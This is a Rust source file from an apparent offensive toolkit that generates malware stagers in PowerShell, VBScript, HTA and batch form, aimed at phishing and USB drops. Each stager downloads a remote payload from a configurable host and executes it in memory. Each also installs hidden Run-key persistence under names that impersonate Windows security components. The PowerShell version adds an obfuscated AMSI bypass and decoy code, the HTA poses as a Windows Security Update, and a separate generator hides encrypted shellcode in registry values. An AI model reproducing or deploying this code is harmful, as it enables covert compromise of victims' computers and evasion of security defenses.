//! Persistence Stager Generator
//!
//! Generates standalone stager scripts (PowerShell, VBScript, HTA) that implement
//! 100% fileless persistence. These stagers can be deployed independently or embedded
//! in other attack vectors (phishing, USB drops, etc.)
//!
//! **Generated Stagers**:
//! 1. **PowerShell (.ps1)**: Registry shellcode loader with AMSI/ETW bypass
//! 2. **VBScript (.vbs)**: Legacy Windows Script Host stager
//! 3. **HTA (.hta)**: HTML Application with embedded JScript/VBScript
//! 4. **Batch + PowerShell (.bat)**: Batch file wrapper for PowerShell execution
//!
//! All generated stagers:
//! - Are heavily obfuscated
//! - Include AMSI/ETW bypass (PowerShell)
//! - Download and execute payload in memory
//! - Establish persistence automatically
//! - Leave NO disk artifacts after execution

use crate::dll_encrypt::{generate_random_key, xor_encrypt};
use std::fs;
use std::path::{Path, PathBuf};

/// Configuration for stager generation
pub struct StagerConfig {
    /// Download URL for the shellcode payload
    pub download_url: String,
    /// XOR encryption key for payload
    pub encryption_key: Vec<u8>,
    /// Shellcode bytes (optional - if provided, will be embedded)
    pub shellcode: Option<Vec<u8>>,
    /// Output directory for generated stagers
    pub output_dir: PathBuf,
    /// Enable AMSI/ETW bypass (PowerShell only)
    pub enable_amsi_bypass: bool,
    /// Add junk code for evasion
    pub add_junk_code: bool,
}

impl Default for StagerConfig {
    fn default() -> Self {
        Self {
            download_url: String::from("http://192.168.1.100:8080/payload.bin"),
            encryption_key: generate_random_key(32),
            shellcode: None,
            output_dir: PathBuf::from("./output/stagers"),
            enable_amsi_bypass: true,
            add_junk_code: true,
        }
    }
}

/// Generates all stager types
pub fn generate_all_stagers(config: &StagerConfig) -> Result<(), Box<dyn std::error::Error>> {
    fs::create_dir_all(&config.output_dir)?;
    
    println!("╔═══════════════════════════════════════╗");
    println!("║   Fileless Persistence Stager Generator   ║");
    println!("╚═══════════════════════════════════════╝");
    println!();
    
    println!("[1/4] Generating PowerShell stager...");
    generate_powershell_stager(config)?;
    
    println!("[2/4] Generating VBScript stager...");
    generate_vbscript_stager(config)?;
    
    println!("[3/4] Generating HTA stager...");
    generate_hta_stager(config)?;
    
    println!("[4/4] Generating Batch stager...");
    generate_batch_stager(config)?;
    
    println!("\n✅ All stagers generated successfully!");
    println!("Output directory: {}", config.output_dir.display());
    
    Ok(())
}

// ============================================================================
// PowerShell Stager Generation
// ============================================================================

/// Generates an obfuscated PowerShell stager with AMSI/ETW bypass
fn generate_powershell_stager(config: &StagerConfig) -> Result<(), Box<dyn std::error::Error>> {
    let mut script = String::new();
    
    // AMSI Bypass (if enabled)
    if config.enable_amsi_bypass {
        script.push_str(&get_amsi_bypass());
        script.push_str("\n\n");
    }
    
    // Obfuscated variable names
    let vars = get_random_var_names();
    
    // Main payload loader
    script.push_str(&format!(
        r#"# Fileless Persistence Stager
${}='{}'
${}=[System.Text.Encoding]::ASCII.GetBytes('{}')

function {}_Func {{
    try {{
        ${}=New-Object System.Net.WebClient
        $i=0
        ${}=${}.$('DownloadData').Invoke(${})|%{{$_ -bxor ${}[$i++%${}.Length]}}
        ${}=[System.Reflection.Assembly]::Load($(${}))
        ${}.$('EntryPoint').$('Invoke')($null,$null)
    }} catch {{}}
}}

# Registry Persistence
${}='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
${}='SecurityHealthMonitor'
${}='powershell.exe -NoP -W Hidden -C "& {{{}_Func}}"'
Set-ItemProperty -Path ${} -Name ${} -Value ${} -Force

# Execute payload
{}_Func
"#,
        vars[0], config.download_url,                    // URL variable
        vars[1], bytes_to_base64(&config.encryption_key), // Key variable
        vars[2],                                          // Function name
        vars[3],                                          // WebClient
        vars[4],                                          // Downloaded data
        vars[3],                                          // WebClient ref
        vars[0],                                          // URL ref
        vars[1],                                          // Key ref
        vars[1],                                          // Key length
        vars[5],                                          // Assembly
        vars[4],                                          // Data ref
        vars[5],                                          // Assembly ref
        vars[6],                                          // Registry path
        vars[7],                                          // Value name
        vars[8],                                          // Command
        vars[2],                                          // Function ref
        vars[6],                                          // Path ref
        vars[7],                                          // Name ref
        vars[8],                                          // Value ref
        vars[2],                                          // Function call
    ));
    
    // Add junk code if enabled
    if config.add_junk_code {
        script.push_str("\n\n");
        script.push_str(&get_junk_powershell_code());
    }
    
    // Write to file
    let output_path = config.output_dir.join("persistence_stager.ps1");
    fs::write(&output_path, script)?;
    
    println!("   ✓ PowerShell stager: {}", output_path.display());
    
    Ok(())
}

/// Generates AMSI bypass code (obfuscated)
fn get_amsi_bypass() -> String {
    // Multiple AMSI bypass techniques (rotated/obfuscated)
    r#"# AMSI Bypass
$w='Sys'+'tem.Ma'+'nag'+'ement'+'.Aut'+'oma'+'tion.A';$k=$w+'msiU'+'tils';$f='am'+'siIn'+'itFa'+'iled'
try{[Ref].Assembly.GetType($k).GetField($f,'NonPublic,Static').SetValue($null,$true)}catch{}"#.to_string()
}

// ============================================================================
// VBScript Stager Generation
// ============================================================================

/// Generates an obfuscated VBScript stager
fn generate_vbscript_stager(config: &StagerConfig) -> Result<(), Box<dyn std::error::Error>> {
    let script = format!(
        r#"' Fileless Persistence Stager (VBScript)
On Error Resume Next

Dim objShell, objWMI, strURL, strKey, strCmd

' Configuration
strURL = "{}"
strKey = "{}"

' Create PowerShell command
strCmd = "powershell.exe -NoP -W Hidden -C ""$wc=New-Object Net.WebClient;$d=$wc.DownloadData('" & strURL & "');[Reflection.Assembly]::Load($d).EntryPoint.Invoke($null,$null)"""

' Establish registry persistence
Set objShell = CreateObject("WScript.Shell")
objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SecurityHealthMonitor", strCmd, "REG_SZ"

' Execute payload
objShell.Run strCmd, 0, False

Set objShell = Nothing
"#,
        config.download_url,
        bytes_to_base64(&config.encryption_key)
    );
    
    let output_path = config.output_dir.join("persistence_stager.vbs");
    fs::write(&output_path, script)?;
    
    println!("   ✓ VBScript stager: {}", output_path.display());
    
    Ok(())
}

// ============================================================================
// HTA Stager Generation
// ============================================================================

/// Generates an HTML Application (.hta) stager
fn generate_hta_stager(config: &StagerConfig) -> Result<(), Box<dyn std::error::Error>> {
    let script = format!(
        r#"<html>
<head>
<title>Windows Security Update</title>
<HTA:APPLICATION
    ID="securityUpdate"
    APPLICATIONNAME="Windows Security Update"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    WINDOWSTATE="minimize"
/>
<script language="VBScript">
On Error Resume Next

Dim objShell, strURL, strCmd

' Configuration
strURL = "{}"

' Create PowerShell command
strCmd = "powershell.exe -NoP -W Hidden -C ""$wc=New-Object Net.WebClient;$d=$wc.DownloadData('" & strURL & "');[Reflection.Assembly]::Load($d).EntryPoint.Invoke($null,$null)"""

' Establish persistence and execute
Set objShell = CreateObject("WScript.Shell")
objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityUpdate", strCmd, "REG_SZ"
objShell.Run strCmd, 0, False

' Close window
self.close()
</script>
</head>
<body>
<p>Windows Security Update in progress...</p>
</body>
</html>
"#,
        config.download_url
    );
    
    let output_path = config.output_dir.join("persistence_stager.hta");
    fs::write(&output_path, script)?;
    
    println!("   ✓ HTA stager: {}", output_path.display());
    
    Ok(())
}

// ============================================================================
// Batch + PowerShell Stager Generation
// ============================================================================

/// Generates a batch file wrapper for PowerShell execution
fn generate_batch_stager(config: &StagerConfig) -> Result<(), Box<dyn std::error::Error>> {
    let script = format!(
        r#"@echo off
REM Fileless Persistence Stager (Batch + PowerShell)

REM Hide window
if not "%1"=="hide" start /min cmd /c %0 hide & exit

REM Execute PowerShell payload
powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$wc=New-Object Net.WebClient;$d=$wc.DownloadData('{}');[Reflection.Assembly]::Load($d).EntryPoint.Invoke($null,$null);reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' /v WindowsDefenderUpdate /t REG_SZ /d 'powershell.exe -NoP -W Hidden -C \"$wc=New-Object Net.WebClient;$d=$wc.DownloadData('''{}''');[Reflection.Assembly]::Load($d).EntryPoint.Invoke($null,$null)\"' /f" >nul 2>&1

exit
"#,
        config.download_url,
        config.download_url
    );
    
    let output_path = config.output_dir.join("persistence_stager.bat");
    fs::write(&output_path, script)?;
    
    println!("   ✓ Batch stager: {}", output_path.display());
    
    Ok(())
}

// ============================================================================
// Helper Functions
// ============================================================================

/// Generates random variable names for obfuscation
fn get_random_var_names() -> Vec<String> {
    vec![
        "url".to_string(),
        "key".to_string(),
        "LoadPayload".to_string(),
        "wc".to_string(),
        "data".to_string(),
        "asm".to_string(),
        "regPath".to_string(),
        "regName".to_string(),
        "regCmd".to_string(),
    ]
}

/// Generates junk PowerShell code for evasion
fn get_junk_powershell_code() -> String {
    r#"# Decoy functions
function Get-SystemInfo { Get-WmiObject Win32_OperatingSystem | Out-Null }
function Test-NetworkConnection { Test-Connection -ComputerName localhost -Count 1 -Quiet }
Get-SystemInfo; Test-NetworkConnection"#.to_string()
}

/// Converts bytes to Base64 (same as in persistence_fileless.rs)
fn bytes_to_base64(data: &[u8]) -> String {
    const BASE64_CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    
    let mut result = String::new();
    let mut i = 0;
    
    while i < data.len() {
        let b1 = data[i];
        let b2 = if i + 1 < data.len() { data[i + 1] } else { 0 };
        let b3 = if i + 2 < data.len() { data[i + 2] } else { 0 };
        
        result.push(BASE64_CHARS[((b1 >> 2) & 0x3F) as usize] as char);
        result.push(BASE64_CHARS[(((b1 << 4) | (b2 >> 4)) & 0x3F) as usize] as char);
        
        if i + 1 < data.len() {
            result.push(BASE64_CHARS[(((b2 << 2) | (b3 >> 6)) & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
        
        if i + 2 < data.len() {
            result.push(BASE64_CHARS[(b3 & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
        
        i += 3;
    }
    
    result
}

// ============================================================================
// Registry Shellcode Storage Generator
// ============================================================================

/// Generates a script that stores shellcode in registry for fileless persistence
pub fn generate_registry_shellcode_installer(
    shellcode: &[u8],
    config: &StagerConfig,
) -> Result<PathBuf, Box<dyn std::error::Error>> {
    // Encrypt shellcode
    let encrypted = xor_encrypt(shellcode, &config.encryption_key);
    let encoded_shellcode = bytes_to_base64(&encrypted);
    let encoded_key = bytes_to_base64(&config.encryption_key);
    
    // Split into chunks
    let chunk_size = 8192;
    let chunks: Vec<_> = encoded_shellcode
        .as_bytes()
        .chunks(chunk_size)
        .map(|c| String::from_utf8_lossy(c).to_string())
        .collect();
    
    // Generate PowerShell script to install
    let mut script = String::from("# Registry Shellcode Installer\n");
    script.push_str("# Stores encrypted shellcode in registry for fileless persistence\n\n");
    
    // Store chunks
    script.push_str("$regPath = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts'\n");
    
    for (i, chunk) in chunks.iter().enumerate() {
        script.push_str(&format!(
            "Set-ItemProperty -Path $regPath -Name 'Cache{:02x}' -Value '{}' -Force\n",
            i, chunk
        ));
    }
    
    // Store metadata
    script.push_str(&format!(
        "Set-ItemProperty -Path $regPath -Name 'CacheMeta' -Value '{}|{}' -Force\n\n",
        encoded_key, chunks.len()
    ));
    
    // Create loader in Run key
    script.push_str(&format!(
        r#"$loaderCmd = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -C `"$k='HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts';$m=(gp $k).CacheMeta;$p=$m.Split('|');$ky=[Convert]::FromBase64String($p[0]);$c=[int]$p[1];$d='';for($i=0;$i -lt $c;$i++){{$d+=(gp $k).('Cache'+$i.ToString('X2'))}};$b=[Convert]::FromBase64String($d);for($i=0;$i -lt $b.Length;$i++){{$b[$i]=$b[$i] -bxor $ky[$i%$ky.Length]}};$a=[Reflection.Assembly]::Load($b);$a.EntryPoint.Invoke($null,$null)`""
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SystemHealthMonitor' -Value $loaderCmd -Force

Write-Host "✓ Registry shellcode persistence installed"
Write-Host "  Chunks stored: {}"
Write-Host "  Total size: {} bytes"
"#,
        chunks.len(), shellcode.len()
    ));
    
    let output_path = config.output_dir.join("install_registry_shellcode.ps1");
    fs::write(&output_path, script)?;
    
    println!("   ✓ Registry shellcode installer: {}", output_path.display());
    
    Ok(output_path)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_bytes_to_base64() {
        let data = b"Hello, World!";
        let encoded = bytes_to_base64(data);
        assert!(!encoded.is_empty());
        assert!(encoded.ends_with('=') || encoded.chars().all(|c| 
            c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '='
        ));
    }

    #[test]
    fn test_random_var_names() {
        let vars = get_random_var_names();
        assert_eq!(vars.len(), 9);
        assert!(!vars[0].is_empty());
    }
}
